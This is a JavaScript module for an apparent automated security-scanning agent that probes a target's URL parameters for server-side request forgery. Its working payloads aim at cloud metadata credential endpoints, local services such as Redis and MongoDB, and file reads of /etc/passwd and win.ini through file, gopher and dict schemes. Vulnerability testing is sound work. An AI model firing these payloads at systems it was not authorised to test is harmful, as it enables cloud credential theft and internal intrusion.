/**
 * SSRFDetector - Server-Side Request Forgery detection agent
 * 
 * Tests for SSRF vulnerabilities that allow attackers to make the server
 * perform requests to arbitrary URLs.
 * 
 * CRITICAL FOR CLOUD: SSRF can access AWS metadata, internal services, etc.
 * 
 * What it tests:
 * - URL parameters accepting external URLs
 * - Callback/webhook parameters
 * - File upload from URL
 * - PDF/image generation from URL
 * - Redirect/proxy parameters
 * - Cloud metadata access (AWS, Azure, GCP)
 * - Internal network scanning
 * - Localhost access
 * - Port scanning via SSRF
 * 
 * Attack scenarios:
 * - Access AWS metadata: http://169.254.169.254/latest/meta-data/
 * - Access internal services: http://localhost:6379/
 * - Port scan internal network: http://192.168.1.1:22/
 * - Read local files: file:///etc/passwd
 */

import { BaseAgent } from '../base-agent.js';
import { createEvidenceEvent, EVENT_TYPES } from '../../worldmodel/evidence-graph.js';
import { CLAIM_TYPES } from '../../epistemics/ledger.js';
import fetch from 'node-fetch';
import { createServer } from 'http';

export class SSRFDetector extends BaseAgent {
    constructor(options = {}) {
        super('SSRFDetector', options);

        this.inputs_schema = {
            type: 'object',
            required: ['target'],
            properties: {
                target: { type: 'string', description: 'Target URL' },
                discoveredParameters: {
                    type: 'array',
                    description: 'Discovered parameters from ParameterDiscoveryAgent',
                    items: { type: 'object' }
                },
            },
        };

        this.outputs_schema = {
            type: 'object',
            properties: {
                vulnerabilities: { type: 'array', items: { type: 'object' } },
                ssrf_vectors: { type: 'array', items: { type: 'object' } },
                accessible_endpoints: { type: 'array', items: { type: 'string' } },
            },
        };

        this.requires = {
            evidence_kinds: ['parameter_discovered', 'injection_point_identified'],
            model_nodes: []
        };

        this.emits = {
            evidence_events: [
                'ssrf_vulnerability_found',
                'ssrf_vector_detected',
                'cloud_metadata_accessible',
                'internal_service_accessible',
                EVENT_TYPES.VULNERABILITY_FOUND,
            ],
            model_updates: [],
            claims: [
                'ssrf_vulnerable',
                'cloud_metadata_exposed',
                'internal_network_accessible',
            ],
            artifacts: [],
        };

        this.default_budget = {
            max_time_ms: 150000, // 2.5 minutes
            max_network_requests: 100,
            max_tokens: 0,
            max_tool_invocations: 0,
        };

        // Parameters likely to be SSRF vectors
        this.ssrfParameters = [
            'url',
            'uri',
            'path',
            'redirect',
            'return',
            'callback',
            'webhook',
            'feed',
            'fetch',
            'proxy',
            'api_url',
            'api',
            'source',
            'target',
            'dest',
            'destination',
            'reference',
            'download',
            'file',
            'image_url',
            'img_url',
            'pdf_url',
            'data_url',
            'next',
            'continue',
            'returnUrl',
            'return_url',
        ];

        // Cloud metadata endpoints
        this.cloudMetadata = [
            // AWS
            {
                name: 'AWS EC2 Metadata',
                url: 'http://169.254.169.254/latest/meta-data/',
                signature: 'ami-id',
            },
            {
                name: 'AWS IMDSv2',
                url: 'http://169.254.169.254/latest/api/token',
                signature: 'X-aws-ec2-metadata-token',
            },
            // Azure
            {
                name: 'Azure Metadata',
                url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                signature: 'compute',
            },
            // Google Cloud
            {
                name: 'GCP Metadata',
                url: 'http://metadata.google.internal/computeMetadata/v1/',
                signature: 'project-id',
            },
        ];

        // Internal services to test
        this.internalServices = [
            { name: 'Redis', url: 'http://localhost:6379/', signature: 'PING' },
            { name: 'Memcached', url: 'http://localhost:11211/', signature: 'version' },
            { name: 'Elasticsearch', url: 'http://localhost:9200/', signature: 'cluster_name' },
            { name: 'MongoDB', url: 'http://localhost:27017/', signature: 'MongoDB' },
            { name: 'MySQL', url: 'http://localhost:3306/', signature: 'mysql' },
        ];

        // Common internal IP ranges
        this.internalIPs = [
            '127.0.0.1',
            'localhost',
            '0.0.0.0',
            '169.254.169.254', // AWS metadata
            '192.168.1.1',     // Common internal
            '10.0.0.1',        // Private range
            '172.17.0.1',      // Docker default
        ];
    }

    async run(ctx, inputs) {
        const { target, discoveredParameters = [] } = inputs;

        const results = {
            vulnerabilities: [],
            ssrf_vectors: [],
            accessible_endpoints: [],
        };

        this.setStatus('Testing for SSRF vulnerabilities...');

        // Phase 1: Identify SSRF-prone parameters
        const ssrfParams = this.identifySSRFParameters(discoveredParameters);

        // Phase 2: Test cloud metadata access
        const metadataVulns = await this.testCloudMetadata(ctx, ssrfParams, target);
        results.vulnerabilities.push(...metadataVulns);

        // Phase 3: Test localhost access
        const localhostVulns = await this.testLocalhostAccess(ctx, ssrfParams, target);
        results.vulnerabilities.push(...localhostVulns);

        // Phase 4: Test internal network access
        const internalVulns = await this.testInternalAccess(ctx, ssrfParams, target);
        results.vulnerabilities.push(...internalVulns);

        // Phase 5: Test for blind SSRF via callback
        const blindVulns = await this.testBlindSSRF(ctx, ssrfParams, target);
        results.vulnerabilities.push(...blindVulns);

        // Phase 6: Test URL scheme bypasses
        const schemeVulns = await this.testURLSchemes(ctx, ssrfParams, target);
        results.vulnerabilities.push(...schemeVulns);

        results.ssrf_vectors = ssrfParams.map(p => ({
            parameter: p.name,
            endpoint: p.endpoint,
        }));

        this.setStatus(`Found ${results.vulnerabilities.length} SSRF vulnerabilities`);

        return results;
    }

    /**
     * Identify parameters likely to be SSRF vectors
     */
    identifySSRFParameters(parameters) {
        const ssrfParams = [];

        for (const param of parameters) {
            const name = param.name.toLowerCase();
            
            if (this.ssrfParameters.some(ssrfParam => name.includes(ssrfParam))) {
                ssrfParams.push(param);
            }
        }

        return ssrfParams;
    }

    /**
     * Test cloud metadata access
     */
    async testCloudMetadata(ctx, parameters, target) {
        const vulnerabilities = [];

        for (const param of parameters.slice(0, 10)) {
            const baseUrl = param.endpoint || target;

            for (const metadata of this.cloudMetadata) {
                try {
                    const testUrl = this.buildTestURL(baseUrl, param.name, metadata.url);
                    
                    const response = await fetch(testUrl, {
                        method: 'GET',
                        timeout: 10000,
                    });

                    if (response.ok) {
                        const body = await response.text();
                        
                        // Check if response contains metadata signature
                        if (body.includes(metadata.signature)) {
                            vulnerabilities.push({
                                type: 'ssrf_cloud_metadata',
                                severity: 'critical',
                                parameter: param.name,
                                endpoint: baseUrl,
                                cloud_provider: metadata.name,
                                confirmed: true,
                                description: `SSRF allows access to ${metadata.name}`,
                                impact: 'Attacker can retrieve cloud credentials and sensitive metadata',
                            });

                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: 'cloud_metadata_accessible',
                                target,
                                payload: {
                                    parameter: param.name,
                                    cloud_provider: metadata.name,
                                    endpoint: baseUrl,
                                },
                            }));

                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: EVENT_TYPES.VULNERABILITY_FOUND,
                                target,
                                payload: {
                                    vulnerability_type: 'ssrf_cloud_metadata',
                                    severity: 'critical',
                                    parameter: param.name,
                                },
                            }));

                            ctx.emitClaim({
                                claim_type: 'cloud_metadata_exposed',
                                subject: baseUrl,
                                predicate: { 
                                    parameter: param.name,
                                    cloud: metadata.name,
                                },
                                base_rate: 0.5,
                            });
                        }
                    }

                } catch (error) {
                    continue;
                }
            }
        }

        return vulnerabilities;
    }

    /**
     * Test localhost access
     */
    async testLocalhostAccess(ctx, parameters, target) {
        const vulnerabilities = [];

        for (const param of parameters.slice(0, 10)) {
            const baseUrl = param.endpoint || target;

            // Test common localhost ports
            const localhostTests = [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://0.0.0.0/',
                'http://localhost:8080/',
                'http://127.0.0.1:8080/',
            ];

            for (const localhostUrl of localhostTests) {
                try {
                    const testUrl = this.buildTestURL(baseUrl, param.name, localhostUrl);
                    
                    const response = await fetch(testUrl, {
                        method: 'GET',
                        timeout: 10000,
                    });

                    if (response.ok) {
                        const body = await response.text();
                        
                        // Check if we got actual response (not error page)
                        if (body.length > 100) {
                            vulnerabilities.push({
                                type: 'ssrf_localhost',
                                severity: 'high',
                                parameter: param.name,
                                endpoint: baseUrl,
                                accessed_url: localhostUrl,
                                confirmed: true,
                                description: 'SSRF allows access to localhost',
                                impact: 'Attacker can access internal services',
                            });

                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: 'ssrf_vulnerability_found',
                                target,
                                payload: {
                                    parameter: param.name,
                                    ssrf_type: 'localhost',
                                    accessed_url: localhostUrl,
                                },
                            }));

                            ctx.emitClaim({
                                claim_type: 'ssrf_vulnerable',
                                subject: baseUrl,
                                predicate: { 
                                    parameter: param.name,
                                    type: 'localhost',
                                },
                                base_rate: 0.5,
                            });

                            break; // Found one, move to next parameter
                        }
                    }

                } catch (error) {
                    continue;
                }
            }
        }

        return vulnerabilities;
    }

    /**
     * Test internal network access
     */
    async testInternalAccess(ctx, parameters, target) {
        const vulnerabilities = [];

        for (const param of parameters.slice(0, 5)) {
            const baseUrl = param.endpoint || target;

            // Test internal services
            for (const service of this.internalServices.slice(0, 3)) {
                try {
                    const testUrl = this.buildTestURL(baseUrl, param.name, service.url);
                    
                    const response = await fetch(testUrl, {
                        method: 'GET',
                        timeout: 10000,
                    });

                    if (response.ok) {
                        const body = await response.text();
                        
                        if (body.includes(service.signature)) {
                            vulnerabilities.push({
                                type: 'ssrf_internal_service',
                                severity: 'high',
                                parameter: param.name,
                                endpoint: baseUrl,
                                service: service.name,
                                confirmed: true,
                                description: `SSRF allows access to internal ${service.name}`,
                                impact: 'Attacker can interact with internal services',
                            });

                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: 'internal_service_accessible',
                                target,
                                payload: {
                                    parameter: param.name,
                                    service: service.name,
                                },
                            }));

                            ctx.emitClaim({
                                claim_type: 'internal_network_accessible',
                                subject: baseUrl,
                                predicate: { 
                                    parameter: param.name,
                                    service: service.name,
                                },
                                base_rate: 0.5,
                            });
                        }
                    }

                } catch (error) {
                    continue;
                }
            }
        }

        return vulnerabilities;
    }

    /**
     * Test blind SSRF via out-of-band detection
     */
    async testBlindSSRF(ctx, parameters, target) {
        const vulnerabilities = [];

        // Note: This is a simplified version
        // In production, you'd use a callback server like Burp Collaborator or Interactsh

        for (const param of parameters.slice(0, 10)) {
            const baseUrl = param.endpoint || target;

            // Test with a unique identifier
            const uniqueId = `ssrf-test-${Date.now()}`;
            const callbackUrl = `http://example.com/${uniqueId}`;

            try {
                const testUrl = this.buildTestURL(baseUrl, param.name, callbackUrl);
                
                const response = await fetch(testUrl, {
                    method: 'GET',
                    timeout: 10000,
                });

                // Check for timing differences
                // If server makes the request, it might take longer
                
                // Note: This is a basic check. Real implementation would:
                // 1. Use an actual callback server
                // 2. Monitor for incoming requests
                // 3. Correlate with unique IDs

                if (response.ok) {
                    const contentLength = response.headers.get('content-length');
                    
                    // If response is suspiciously small/large, might indicate SSRF
                    if (contentLength && (parseInt(contentLength) > 1000)) {
                        ctx.emitEvidence(createEvidenceEvent({
                            source: this.name,
                            event_type: 'ssrf_vector_detected',
                            target,
                            payload: {
                                parameter: param.name,
                                ssrf_type: 'potential_blind',
                                note: 'Manual verification recommended',
                            },
                        }));
                    }
                }

            } catch (error) {
                continue;
            }
        }

        return vulnerabilities;
    }

    /**
     * Test URL scheme bypasses
     */
    async testURLSchemes(ctx, parameters, target) {
        const vulnerabilities = [];

        // Various URL schemes to test
        const schemes = [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://localhost:11211/',
            'gopher://localhost:6379/',
            'ftp://localhost/',
        ];

        for (const param of parameters.slice(0, 5)) {
            const baseUrl = param.endpoint || target;

            for (const schemeUrl of schemes) {
                try {
                    const testUrl = this.buildTestURL(baseUrl, param.name, schemeUrl);
                    
                    const response = await fetch(testUrl, {
                        method: 'GET',
                        timeout: 10000,
                    });

                    if (response.ok) {
                        const body = await response.text();
                        
                        // Check for file read success
                        if ((schemeUrl.includes('passwd') && body.includes('root:')) ||
                            (schemeUrl.includes('win.ini') && body.includes('[extensions]'))) {
                            
                            vulnerabilities.push({
                                type: 'ssrf_file_read',
                                severity: 'critical',
                                parameter: param.name,
                                endpoint: baseUrl,
                                scheme: schemeUrl.split(':')[0],
                                confirmed: true,
                                description: 'SSRF allows local file read',
                                impact: 'Attacker can read local files',
                            });

                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: EVENT_TYPES.VULNERABILITY_FOUND,
                                target,
                                payload: {
                                    vulnerability_type: 'ssrf_file_read',
                                    severity: 'critical',
                                    parameter: param.name,
                                    scheme: schemeUrl.split(':')[0],
                                },
                            }));
                        }
                    }

                } catch (error) {
                    continue;
                }
            }
        }

        return vulnerabilities;
    }

    // ========================================================================
    // HELPER METHODS
    // ========================================================================

    /**
     * Build test URL with SSRF payload
     */
    buildTestURL(baseUrl, paramName, ssrfPayload) {
        try {
            const parsed = new URL(baseUrl);
            parsed.searchParams.set(paramName, ssrfPayload);
            return parsed.toString();
        } catch {
            // Fallback: simple concatenation
            const separator = baseUrl.includes('?') ? '&' : '?';
            return `${baseUrl}${separator}${paramName}=${encodeURIComponent(ssrfPayload)}`;
        }
    }

    normalizeBaseUrl(url) {
        try {
            const parsed = new URL(url);
            return `${parsed.protocol}//${parsed.host}`;
        } catch {
            return url;
        }
    }
}

export default SSRFDetector;
